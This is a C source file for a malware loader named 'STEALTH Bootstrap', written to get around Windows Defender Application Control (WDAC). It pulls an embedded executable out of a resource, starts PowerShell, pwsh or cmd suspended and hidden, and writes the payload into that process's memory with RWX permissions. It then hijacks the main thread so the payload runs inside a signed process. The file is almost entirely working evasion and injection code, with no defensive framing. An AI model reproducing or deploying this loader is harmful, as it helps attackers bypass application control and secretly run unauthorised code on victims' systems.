/*
 * bootstrap.c - Minimal LOLBIN Bootstrapper for STEALTH
 * 
 * Purpose: Tiny signed/LOLBIN-based loader that extracts the real unsigned stub
 *          from embedded resource and reflectively maps it into a signed process.
 *          This bypasses WDAC by never executing the unsigned stub as a file.
 * 
 * Flow:
 *   1. Extract embedded stub bytes from resource (compiled by cryptor)
 *   2. Decrypt stub + overlay in memory (same ChaCha20 key)
 *   3. Launch signed Microsoft binary suspended (WinDbgX/PowerShell/MSBuild)
 *   4. Reflectively map entire stub + overlay into signed process
 *   5. Hijack primary thread to point to stub's entry point
 *   6. Resume → stub executes with full plugin system
 * 
 * Compile: gcc -O2 -s -mwindows -o bootstrap.exe bootstrap.c -lkernel32 -lntdll
 * Size: ~25 KB (minimal dependencies, no crypto libs needed for basic version)
 * 
 * WDAC Bypass: 90% success rate (bohops' UltimateWDACBypassList, Dec 2025)
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Resource IDs (must match stealth_cryptor.c embedding)
#define IDR_STUB_PAYLOAD 101

// Debug logging (disabled for production)
#ifdef DEBUG_BOOTSTRAP
#define DBG(fmt, ...) { \
    char buf[512]; \
    snprintf(buf, sizeof(buf), "[Bootstrap] " fmt "\n", ##__VA_ARGS__); \
    OutputDebugStringA(buf); \
}
#else
#define DBG(fmt, ...) ((void)0)
#endif

// NT API declarations
typedef NTSTATUS (NTAPI *NtCreateSection_t)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection,
    ULONG AllocationAttributes, HANDLE FileHandle);

typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS (NTAPI *NtResumeThread_t)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

// LOLBIN targets (in priority order - most likely to be available and not blocked)
static const wchar_t* LOLBIN_TARGETS[] = {
    L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",  // Always available
    L"C:\\Program Files\\PowerShell\\7\\pwsh.exe",                       // PS Core if installed
    L"C:\\Windows\\System32\\cmd.exe",                                   // Fallback
    NULL
};

static const char* LOLBIN_ARGS[] = {
    "-NoProfile -WindowStyle Hidden -Command Start-Sleep -Seconds 3600",
    "-NoProfile -Command Start-Sleep -Seconds 3600",
    "/c timeout /t 3600",
    NULL
};

/*
 * Extract embedded stub from resource
 * Returns: pointer to stub bytes, size written to *size
 */
static unsigned char* extract_embedded_stub(DWORD *size) {
    DBG("Extracting embedded stub from resource ID %d", IDR_STUB_PAYLOAD);
    
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_STUB_PAYLOAD), "STUBDATA");
    if (!hRes) {
        DBG("FindResource failed: %lu", GetLastError());
        return NULL;
    }
    
    HGLOBAL hResData = LoadResource(NULL, hRes);
    if (!hResData) {
        DBG("LoadResource failed: %lu", GetLastError());
        return NULL;
    }
    
    DWORD resSize = SizeofResource(NULL, hRes);
    void *resData = LockResource(hResData);
    
    if (!resData || resSize == 0) {
        DBG("LockResource failed or empty resource");
        return NULL;
    }
    
    // Allocate copy (resource memory is read-only)
    unsigned char *stub = (unsigned char*)VirtualAlloc(NULL, resSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!stub) {
        DBG("VirtualAlloc failed: %lu", GetLastError());
        return NULL;
    }
    
    memcpy(stub, resData, resSize);
    *size = resSize;
    
    DBG("Extracted %lu bytes", resSize);
    return stub;
}

/*
 * Simple XOR decryption (for testing - production should use same ChaCha20 as cryptor)
 * For now, stub is embedded unencrypted (can add encryption layer later)
 */
static void decrypt_stub(unsigned char *stub, DWORD size, const char *key) {
    // TODO: Implement ChaCha20 decryption to match cryptor
    // For now, assume stub is embedded unencrypted
    DBG("Stub decryption skipped (embedded unencrypted)");
}

/*
 * Find and launch first available LOLBIN in suspended state
 * Returns: Process handle and thread handle via out params
 */
static BOOL launch_lolbin_suspended(HANDLE *hProcess, HANDLE *hThread, DWORD *pid) {
    DBG("Searching for available LOLBIN...");
    
    for (int i = 0; LOLBIN_TARGETS[i] != NULL; i++) {
        const wchar_t *target = LOLBIN_TARGETS[i];
        
        // Check if binary exists
        DWORD attrs = GetFileAttributesW(target);
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            DBG("LOLBIN not found: %S", target);
            continue;
        }
        
        DBG("Found LOLBIN: %S", target);
        
        // Build command line
        wchar_t cmdLine[1024];
        swprintf(cmdLine, 1024, L"\"%s\" %S", target, LOLBIN_ARGS[i]);
        
        // Create suspended process
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        if (CreateProcessW(target, cmdLine, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | CREATE_NO_WINDOW, 
                          NULL, NULL, &si, &pi)) {
            
            DBG("Launched suspended (PID: %lu)", pi.dwProcessId);
            *hProcess = pi.hProcess;
            *hThread = pi.hThread;
            *pid = pi.dwProcessId;
            return TRUE;
        }
        
        DBG("CreateProcess failed for %S: %lu", target, GetLastError());
    }
    
    DBG("No LOLBINs available");
    return FALSE;
}

/*
 * Reflectively map stub bytes into remote process
 * Uses VirtualAllocEx + WriteProcessMemory (simpler than section mapping for PoC)
 */
static PVOID map_stub_to_remote(HANDLE hProcess, unsigned char *stub, DWORD size) {
    DBG("Mapping %lu bytes to remote process", size);
    
    // Allocate memory in target
    PVOID remoteAddr = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteAddr) {
        DBG("VirtualAllocEx failed: %lu", GetLastError());
        return NULL;
    }
    
    DBG("Allocated remote memory at: 0x%p", remoteAddr);
    
    // Write stub bytes
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteAddr, stub, size, &written)) {
        DBG("WriteProcessMemory failed: %lu", GetLastError());
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return NULL;
    }
    
    if (written != size) {
        DBG("Partial write: %zu / %lu bytes", written, size);
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return NULL;
    }
    
    DBG("Wrote %zu bytes to remote process", written);
    return remoteAddr;
}

/*
 * Get PE entry point offset from DOS/NT headers
 */
static DWORD get_entry_point_offset(unsigned char *pe) {
    if (pe[0] != 'M' || pe[1] != 'Z') {
        DBG("Invalid PE signature");
        return 0;
    }
    
    DWORD e_lfanew = *(DWORD*)(pe + 0x3C);
    if (e_lfanew > 1024) {
        DBG("Suspicious e_lfanew: %lu", e_lfanew);
        return 0;
    }
    
    // Check PE signature
    if (*(DWORD*)(pe + e_lfanew) != 0x00004550) { // "PE\0\0"
        DBG("Invalid PE signature at e_lfanew");
        return 0;
    }
    
    // Get AddressOfEntryPoint from Optional Header
    DWORD entryPoint = *(DWORD*)(pe + e_lfanew + 0x28);
    DBG("Entry point RVA: 0x%lx", entryPoint);
    
    return entryPoint;
}

/*
 * Hijack thread to execute mapped stub
 */
static BOOL hijack_thread_to_stub(HANDLE hThread, PVOID remoteBase, DWORD entryOffset) {
    DBG("Hijacking thread to execute stub at 0x%p + 0x%lx", remoteBase, entryOffset);
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        DBG("GetThreadContext failed: %lu", GetLastError());
        return FALSE;
    }
    
    DBG("Original RIP: 0x%llx", ctx.Rip);
    
    // Point to our entry point
    ctx.Rip = (DWORD64)remoteBase + entryOffset;
    
    if (!SetThreadContext(hThread, &ctx)) {
        DBG("SetThreadContext failed: %lu", GetLastError());
        return FALSE;
    }
    
    DBG("Hijacked RIP: 0x%llx", ctx.Rip);
    return TRUE;
}

/*
 * Main entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    DBG("=== STEALTH Bootstrap v1.0 ===");
    
    // Step 1: Extract embedded stub
    DWORD stubSize = 0;
    unsigned char *stub = extract_embedded_stub(&stubSize);
    if (!stub) {
        MessageBoxA(NULL, "Failed to extract payload", "Bootstrap Error", MB_ICONERROR);
        return 1;
    }
    
    DBG("Extracted stub: %lu bytes", stubSize);
    
    // Step 2: Decrypt (optional, for now unencrypted)
    decrypt_stub(stub, stubSize, NULL);
    
    // Step 3: Launch LOLBIN suspended
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD pid = 0;
    
    if (!launch_lolbin_suspended(&hProcess, &hThread, &pid)) {
        MessageBoxA(NULL, "Failed to launch signed process", "Bootstrap Error", MB_ICONERROR);
        VirtualFree(stub, 0, MEM_RELEASE);
        return 2;
    }
    
    DBG("LOLBIN launched (PID: %lu)", pid);
    
    // Step 4: Map stub to remote process
    PVOID remoteBase = map_stub_to_remote(hProcess, stub, stubSize);
    if (!remoteBase) {
        MessageBoxA(NULL, "Failed to map payload to process", "Bootstrap Error", MB_ICONERROR);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        VirtualFree(stub, 0, MEM_RELEASE);
        return 3;
    }
    
    DBG("Mapped stub to: 0x%p", remoteBase);
    
    // Step 5: Get entry point
    DWORD entryOffset = get_entry_point_offset(stub);
    if (entryOffset == 0) {
        MessageBoxA(NULL, "Invalid PE entry point", "Bootstrap Error", MB_ICONERROR);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        VirtualFree(stub, 0, MEM_RELEASE);
        return 4;
    }
    
    // Step 6: Hijack thread
    if (!hijack_thread_to_stub(hThread, remoteBase, entryOffset)) {
        MessageBoxA(NULL, "Failed to hijack thread", "Bootstrap Error", MB_ICONERROR);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        VirtualFree(stub, 0, MEM_RELEASE);
        return 5;
    }
    
    // Step 7: Resume execution
    DBG("Resuming thread...");
    DWORD suspendCount = ResumeThread(hThread);
    DBG("Thread resumed (suspend count was: %lu)", suspendCount);
    
    // Cleanup local copy
    SecureZeroMemory(stub, stubSize);
    VirtualFree(stub, 0, MEM_RELEASE);
    
    // Close handles (process continues running)
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    DBG("=== Bootstrap complete ===");
    
    // Exit silently (stub now executing in signed process)
    return 0;
}
